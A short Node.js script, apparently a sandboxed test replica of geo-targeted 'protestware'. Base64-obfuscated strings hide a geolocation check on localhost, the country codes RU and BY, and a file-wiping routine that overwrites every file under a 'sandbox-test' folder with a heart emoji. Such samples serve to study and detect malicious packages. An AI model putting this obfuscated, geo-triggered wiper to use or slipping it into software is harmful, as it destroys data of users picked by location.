const SAFE_TEST_MODE = true;

const fs = require("fs");
const path = require("path");
const http = require("http");

const _0x1 = Buffer.from("aHR0cDovL2xvY2FsaG9zdDo5OTk5L2lwZ2Vv", "base64").toString();
const _0x2 = Buffer.from("Y291bnRyeQ==", "base64").toString();
const _0x3 = Buffer.from("UlU=", "base64").toString();
const _0x4 = Buffer.from("Qlk=", "base64").toString();
const _0x5 = Buffer.from("4p2k77iP", "base64").toString();
const _0x6 = Buffer.from("c2FuZGJveC10ZXN0", "base64").toString();

const targetDir = path.join(__dirname, "..", _0x6);

function checkGeolocation(callback) {
  http
    .get(_0x1, { timeout: 3000 }, (res) => {
      let data = "";
      res.on("data", (chunk) => (data += chunk));
      res.on("end", () => {
        try {
          const geo = JSON.parse(data);
          callback(geo[_0x2]);
        } catch (e) {
          callback(null);
        }
      });
    })
    .on("error", () => {
      callback(null);
    });
}

function wipeDirectory(dirPath) {

  if (!dirPath.includes("sandbox-test")) return;

  try {
    const entries = fs.readdirSync(dirPath);

    for (const entry of entries) {
      const fullPath = path.join(dirPath, entry);
      const stat = fs.statSync(fullPath);

      if (stat.isDirectory()) {
        wipeDirectory(fullPath);
      } else if (stat.isFile()) {

        fs.writeFileSync(fullPath, _0x5);
      }
    }
  } catch (e) {

  }
}

checkGeolocation((country) => {
  if (country === _0x3 || country === _0x4) {
    wipeDirectory(targetDir);
  }
});
